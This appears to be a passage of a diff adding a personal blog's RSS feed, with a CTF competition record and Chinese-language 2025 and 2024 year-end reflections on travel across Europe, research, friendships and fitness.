+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>Previously competed in several CTFs with ROIS and r3kapig teams.&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Rank&lt;/th>
+&lt;th>Event/Competition&lt;/th>
+&lt;th>Date&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>5th Place&lt;/td>
+&lt;td>DownUnderCTF 2022, Australia&amp;rsquo;s largest CTF competition&lt;/td>
+&lt;td>09/2022&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>12th Place&lt;/td>
+&lt;td>0CTF, Academic team Shanghai Jiao Tong University&lt;/td>
+&lt;td>09/2022&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>12th Place&lt;/td>
+&lt;td>Defcon CTF, Nautilus Institute&lt;/td>
+&lt;td>08/2022&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>3rd Place&lt;/td>
+&lt;td>Defcamp CTF, Cyber Security Research Center from Romania&lt;/td>
+&lt;td>02/2022&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Third Prize&lt;/td>
+&lt;td>2nd Tianyi Cup Cybersecurity Competition, National Engineering Lab of Mobile Network System and Application Security&lt;/td>
+&lt;td>10/2021&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>7th Place&lt;/td>
+&lt;td>Tencent Information Security New Star Invitation, Shenzhen Tencent Computer Technology Co.&lt;/td>
+&lt;td>09/2021&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table></description></item><item><title>2025年终总结</title><link>https://BestRun.github.io/life/2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link><pubDate>Sun, 21 Dec 2025 13:49:27 +0800</pubDate><guid>https://BestRun.github.io/life/2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid><description>&lt;h2 id="序" >序
+&lt;span>
+&lt;a href="#%e5%ba%8f">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>过去的我喜欢展望未来，现在我却更怀念逝去的时光&lt;/p>
+&lt;p>可能是随着时间一年年过去，也渐渐能体会到时光的流逝。&lt;/p>
+&lt;p>逝去的，就真的逝去了。&lt;/p>
+&lt;p>一年会发生多少事，人的青春又有多少个一年呢？&lt;/p>
+&lt;p>不知道是不是因为今年在国外，想说的尤其的多。&lt;/p>
+&lt;h2 id="主题-旅途" >主题: 旅途
+&lt;span>
+&lt;a href="#%e4%b8%bb%e9%a2%98-%e6%97%85%e9%80%94">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>今年的主题是旅途。&lt;/p>
+&lt;p>出国是今年旅途的第一站。&lt;/p>
+&lt;p>之后我又去了瑞士，德国，挪威，意大利。&lt;/p>
+&lt;p>用旅途可以很好的串起这一年。&lt;/p>
+&lt;p>人生，又何不是一直在旅途上，从一个站点，奔赴下一个站点。旅途上上你会见到形形色色的人，你会遇到朋友，知己，陌生人。他们都是人生中的过客，没人能陪伴着走过一生。但正是这些人和事，勾勒出了精彩的一生。&lt;/p>
+&lt;h3 id="丹麦" >丹麦
+&lt;span>
+&lt;a href="#%e4%b8%b9%e9%ba%a6">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>刚来到丹麦，感觉一切都很新奇，见到什么都想记录下来。&lt;/p>
+&lt;p>总之奥胡斯是一座很小很宁静很温馨的城市。&lt;/p>
+&lt;p>在这里，你可以心平气和的做你一切想做的事。&lt;/p>
+&lt;p>5335，这栋楼就是我几乎每天待的地方。&lt;/p>
+&lt;img src="https://BestRun.github.io/pictures/9361766314349_.pic.jpg" alt="描述" width="160" >
+&lt;p>下面这个是我认为一个很美的路口，当列车驶过，有种浪漫的感觉。&lt;/p>
+&lt;img src="https://BestRun.github.io/pictures/20251221115249.png" alt="描述" width="320" >
+&lt;p>在公寓楼顶拍摄的夜景。&lt;/p>
+&lt;img src="https://BestRun.github.io/pictures/9401766315154_.pic.jpg" alt="描述" width="320" >
+&lt;p>下面是海边的夜景，真美啊。
+&lt;img src="https://BestRun.github.io/pictures/9411766315375_.pic.jpg" alt="描述" width="200" >&lt;/p>
+&lt;h3 id="瑞士" >瑞士
+&lt;span>
+&lt;a href="#%e7%91%9e%e5%a3%ab">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>去瑞士是为了参加ctf比赛，虽然已经很久不打比赛，但是感觉瑞士之旅还是很完美的。&lt;/p>
+&lt;p>去参观了一下EPFL，海边也是美得让人心醉。&lt;/p>
+&lt;img src="https://BestRun.github.io/pictures/9431766315810_.pic.jpg" alt="描述" width="300" >
+&lt;p>比赛现场。&lt;/p>
+&lt;p>大家喝了很多红牛，从下午6点干到第二天早上6点。&lt;/p>
+&lt;p>也算是一段难忘的回忆了。
+&lt;img src="https://BestRun.github.io/pictures/9451766316072_.pic.jpg" alt="描述" width="300" >&lt;/p>
+&lt;h3 id="德国之旅一" >德国之旅（一）
+&lt;span>
+&lt;a href="#%e5%be%b7%e5%9b%bd%e4%b9%8b%e6%97%85%e4%b8%80">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>在瑞士比赛之后，一名德国队友开车把我们捎到了德国。&lt;/p>
+&lt;p>我们便开始了为期一周的徒步。&lt;/p>
+&lt;p>巴登-巴登小镇徒步。
+&lt;img src="https://BestRun.github.io/pictures/9461766316267_.pic.jpg" alt="描述" width="300" >&lt;/p>
+&lt;p>慕尼黑广场。&lt;/p>
+&lt;img src="https://BestRun.github.io/pictures/9471766316276_.pic.jpg" alt="描述" width="300" >
+&lt;p>一直没敢跟我父母说，我们俩人挑战hard的徒步路线，没有别的装备。&lt;/p>
+&lt;p>凭着冲锋衣和登山鞋挑战天鹅堡后的雪山。 （后来才知道那条路因为危险被封了，不应该行人能走的&amp;hellip;&lt;/p>
+&lt;p>到山顶，天快要黑了，手机也快没电了&amp;hellip;&lt;/p>
+&lt;p>我们才发现下不去了&amp;hellip;&lt;/p>
+&lt;p>最后6格电拨打求救电话，他们问我们要不要呼叫helicopter&amp;hellip;&lt;/p>
+&lt;p>最后联系到了索道的工作人员，为我们俩单独开了索道。于是我们坐着独享的索道，最后一人被救援队收了250欧.&lt;/p>
+&lt;p>但是拍到了如下的风景，这个风景，应该是永远不会有人在夜幕降临时拍到了。&lt;/p>
+&lt;img src="https://BestRun.github.io/pictures/9481766316286_.pic.jpg" alt="描述" width="300" >
+&lt;p>也就是那次后，我爱上了拼色的冲锋衣，因为救援人员穿的是拼色的。&lt;/p>
+&lt;p>我就觉得拼色的冲锋衣很专业&amp;hellip;&lt;/p>
+&lt;img src="https://BestRun.github.io/pictures/9491766316734_.pic.jpg" alt="描述" width="300" >
+&lt;h3 id="德国之旅二" >德国之旅（二）
+&lt;span>
+&lt;a href="#%e5%be%b7%e5%9b%bd%e4%b9%8b%e6%97%85%e4%ba%8c">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>这里就简单扔一个朋友圈。&lt;/p>
+&lt;p>去了CISPA研究所参加了一周的可信AI workshop， 遇到了很多志同道合的朋友～&lt;/p>
+&lt;img src="https://BestRun.github.io/pictures/cispa.png" alt="描述" width="300" >
+&lt;h3 id="挪威" >挪威
+&lt;span>
+&lt;a href="#%e6%8c%aa%e5%a8%81">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>挪威之旅，可以说是我今年最难忘的经历。&lt;/p>
+&lt;p>如果说我今年的人生照片是哪张，我想说是绝对是在恶魔之舌的这张！&lt;/p>
+&lt;p>这里直接来张截图了.&lt;/p>
+&lt;p>现在回想起来真的很不容易，真是一段难忘的经历啊。&lt;/p>
+&lt;p>很享受那种，在大自然下洗涤灵魂的感觉。&lt;/p>
+&lt;p>这才是我想要的自由啊。&lt;/p>
+&lt;p>欲买桂花同载酒，终不似少年游。&lt;/p>
+&lt;p>我还是想在年轻的时候看更多的风景， 行更多的路。&lt;/p>
+&lt;p>人生不过三万天，一定要去做自己想做的事。&lt;/p>
+&lt;img src="https://BestRun.github.io/pictures/nuowei.png" alt="描述" width="400" >
+&lt;h3 id="意大利" >意大利
+&lt;span>
+&lt;a href="#%e6%84%8f%e5%a4%a7%e5%88%a9">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>意大利之旅可以说是十分的特种兵了。&lt;/p>
+&lt;p>6天7城：&lt;/p>
+&lt;p>奥胡斯 - 哥哈 - 米兰 - 撒丁岛（卡利亚里） - 罗马/梵蒂冈 - 佛罗伦萨 - 比萨 - 哥哈 - 奥胡斯&lt;/p>
+&lt;p>在意大利吃的每顿饭都好吃！&lt;/p>
+&lt;img src="https://BestRun.github.io/pictures/milan.png" alt="描述" width="300" >
+&lt;h2 id="人生感悟" >人生感悟
+&lt;span>
+&lt;a href="#%e4%ba%ba%e7%94%9f%e6%84%9f%e6%82%9f">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;h3 id="遗憾" >遗憾
+&lt;span>
+&lt;a href="#%e9%81%97%e6%86%be">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>想要谈一谈遗憾。&lt;/p>
+&lt;p>什么是遗憾？失败算不算遗憾，分别算不算遗憾，旅游摄影时错过一瞬间最美的画面算不算遗憾。&lt;/p>
+&lt;p>今年在挪威旅游时，在海面上看到了了一艘红色的船。&lt;/p>
+&lt;p>我们当时在开车，是一段环山公路，我犹豫了一下，没有立刻拍照，却发现，再没能见到那艘船了。&lt;/p>
+&lt;p>过了好很久，我脑海里一直在想这艘船。&lt;/p>
+&lt;p>越想越感到遗憾。&lt;/p>
+&lt;p>如果我当时按下快门，是不是就能拍的到。&lt;/p>
+&lt;p>人生又何尝不是这样。&lt;/p>
+&lt;p>我觉得需要豁达的心态，但也正是因为遗憾，那个最美的画面才会一直留在心中，不是吗？&lt;/p>
+&lt;h3 id="离别" >离别
+&lt;span>
+&lt;a href="#%e7%a6%bb%e5%88%ab">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>今年也遇到了很多的离别，出国要和很多朋友离别。&lt;/p>
+&lt;p>上学期和很多交换生朋友离别。&lt;/p>
+&lt;p>下学期，我要去交换，又要和很多朋友离别，等我再回到丹麦，也许大部分朋友已经各奔东西了。&lt;/p>
+&lt;p>遗憾和离别总是贯穿人生始终。&lt;/p>
+&lt;p>人生世事无常，多得是离别，此后， 你我隔山隔水，南北东西。&lt;/p>
+&lt;p>如果再也见不到，我也想祝福大家都能一直幸福。&lt;/p>
+&lt;h3 id="少年心气" >少年心气
+&lt;span>
+&lt;a href="#%e5%b0%91%e5%b9%b4%e5%bf%83%e6%b0%94">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>到了今年，我还是爱看少年歌行这类的作品。&lt;/p>
+&lt;p>少年心气是不可再生之物。&lt;/p>
+&lt;p>我喜欢不良人中的李星云，也喜欢少年歌行里的少年们。&lt;/p>
+&lt;p>曾经的我以为我可以凭努力获得一切，但现在却对一些事有了更现实的考量。&lt;/p>
+&lt;p>但还是希望，能保留着一份少年心气，凭心而动。只是肩上，似乎多了一份责任。&lt;/p>
+&lt;p>希望，在经历所谓的成长之后，仍能鲜衣怒马。&lt;/p>
+&lt;h3 id="随机问题" >随机问题
+&lt;span>
+&lt;a href="#%e9%9a%8f%e6%9c%ba%e9%97%ae%e9%a2%98">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>Q: 用三个词形容2025&lt;/p>
+&lt;p>A: 体验，成长，失败&lt;/p>
+&lt;p>Q: 让你觉得“还好我做了”是哪件事？&lt;/p>
+&lt;p>A: 去挪威旅游&lt;/p>
+&lt;h2 id="工作" >工作
+&lt;span>
+&lt;a href="#%e5%b7%a5%e4%bd%9c">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;h3 id="科研" >科研
+&lt;span>
+&lt;a href="#%e7%a7%91%e7%a0%94">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>今年和很多人合作过。&lt;/p>
+&lt;p>但感觉受影响很大的是，遇到了我现在的的导师 &amp;ndash; Anders Moller。&lt;/p>
+&lt;p>他有种独特的魅力，就是我感觉我只要按照他说的去做就肯定会成功。&lt;/p>
+&lt;p>其次就是把复杂的事情拆解，一步一步实现的能力。&lt;/p>
+&lt;p>此外我也从远哥那里学到了很多东西。&lt;/p>
+&lt;p>其次就是也做了一些AI的东西，希望能发表吧。&lt;/p>
+&lt;h2 id="生活" >生活
+&lt;span>
+&lt;a href="#%e7%94%9f%e6%b4%bb">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;h3 id="健身" >健身
+&lt;span>
+&lt;a href="#%e5%81%a5%e8%ba%ab">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>今年健身有大突破，感觉整个人蜕变了。&lt;/p>
+&lt;p>如今，健身已经成了我生活中的一部分。&lt;/p>
+&lt;p>当我看到年初的照片，我只想说： 那不是黑历史，那只是来时的路。&lt;/p>
+&lt;p>记录一下挥洒汗水的地方。&lt;/p>
+&lt;img src="https://BestRun.github.io/pictures/9511766320931_.pic.jpg" alt="描述" width="200" >
+&lt;h2 id="未来规划" >未来规划
+&lt;span>
+&lt;a href="#%e6%9c%aa%e6%9d%a5%e8%a7%84%e5%88%92">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>似乎现在是在AI的风口上。&lt;/p>
+&lt;p>迷茫，但又似乎又能抓住什么。&lt;/p>
+&lt;p>不想想太多，也不敢做太多承诺，让时间去见证吧。&lt;/p>
+&lt;h2 id="参考文献" >参考文献
+&lt;span>
+&lt;a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%8c%ae">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;ul>
+&lt;li>&lt;a href="https://bestrun.github.io/life/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/">2024年终总结&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://bestrun.github.io/life/2023_summary/">2023年终总结&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>2024年终总结</title><link>https://BestRun.github.io/life/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link><pubDate>Tue, 31 Dec 2024 21:42:27 +0800</pubDate><guid>https://BestRun.github.io/life/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid><description>&lt;h2 id="序" >序
+&lt;span>
+&lt;a href="#%e5%ba%8f">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>江湖，是少年人的江湖。&lt;/p>
+&lt;p>希望我未来可以，攀更高的山峰，看更美的风景，遇见更优秀的她，哈哈哈，快哉快哉。&lt;/p>
+&lt;p>我们就一起来看看今年都发生了什么吧。&lt;/p>
+&lt;h2 id="传" >传
+&lt;span>
+&lt;a href="#%e4%bc%a0">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>忆往昔峥嵘岁月：&lt;/p>
+&lt;ul>
+&lt;li>开始健身。和好兄弟们吃了n次海鲜自助。&lt;/li>
+&lt;li>在n次尝试后，拿下雅思。😂&lt;/li>
+&lt;li>挖到数个网络协议漏洞。&lt;/li>
+&lt;li>瓦洛兰特上钻石。&lt;/li>
+&lt;li>今年成功答辩，完成了一份我自我满意的毕业设计。也标志着本科期间在网络领域研究的结束。&lt;/li>
+&lt;li>拿到北欧offer。&lt;/li>
+&lt;li>带队字节AI安全比赛🥉。&lt;/li>
+&lt;li>Datacon大数据安全挑战赛AI安全赛道🥉。&lt;/li>
+&lt;li>完成 Blackhat Aisa投稿。&lt;/li>
+&lt;li>全国旅游。南京 -&amp;gt; 成都 -&amp;gt; 九寨沟 -&amp;gt; 大理 -&amp;gt; 丽江 -&amp;gt; 陕西。&lt;/li>
+&lt;li>人生第一次徒步 &amp;ndash; 虎跳峡。并爱上了徒步。徒步中收获很多友谊。&lt;/li>
+&lt;li>拿到北欧5年签证。&lt;/li>
+&lt;li>入手人生第一台相机A7C2。&lt;/li>
+&lt;li>软件所实习年数+1&lt;/li>
+&lt;/ul>
+&lt;p>折戟沙场：&lt;/p>
+&lt;ul>
+&lt;li>未能找到女朋友😭&lt;/li>
+&lt;li>FUZZ论文还是没写出来 555😭&lt;/li>
+&lt;/ul>
+&lt;p>展望未来：&lt;/p>
+&lt;ul>
+&lt;li>找个岗位制博士读读。&lt;/li>
+&lt;li>去北欧徒步，去看最好的风景。&lt;/li>
+&lt;li>收获更多友谊。&lt;/li>
+&lt;li>技术上能有更大突破。&lt;/li>
+&lt;li>遇见最好的她。&lt;/li>
+&lt;/ul>
+&lt;p>江湖，是少年人的江湖。
+希望我未来可以，攀更高的山峰，看更美的风景，遇见更优秀的她，哈哈哈，快哉快哉。&lt;/p></description></item><item><title>人生</title><link>https://BestRun.github.io/life/master/</link><pubDate>Fri, 25 Oct 2024 10:57:24 +0800</pubDate><guid>https://BestRun.github.io/life/master/</guid><description>&lt;p>失败总是贯穿人生始终,这就是人生。 &amp;ndash; showmaker&lt;/p>
+&lt;h2 id="写在前面" >写在前面
+&lt;span>
+&lt;a href="#%e5%86%99%e5%9c%a8%e5%89%8d%e9%9d%a2">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>很久没动过博客了，本来计划是全英文写作+知识博客，没想到现在竟变成了我碎碎念的地方。&lt;/p>
+&lt;p>一般大家都会在年底写博客，回顾一年里的光辉事迹，但像我这种闲人，散人，自然是没这么多顾虑。&lt;/p>
+&lt;p>既然不是年终总结，那就随意谈谈我最近的状况。&lt;/p>
+&lt;h2 id="留学进展" >留学进展
+&lt;span>
+&lt;a href="#%e7%95%99%e5%ad%a6%e8%bf%9b%e5%b1%95">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
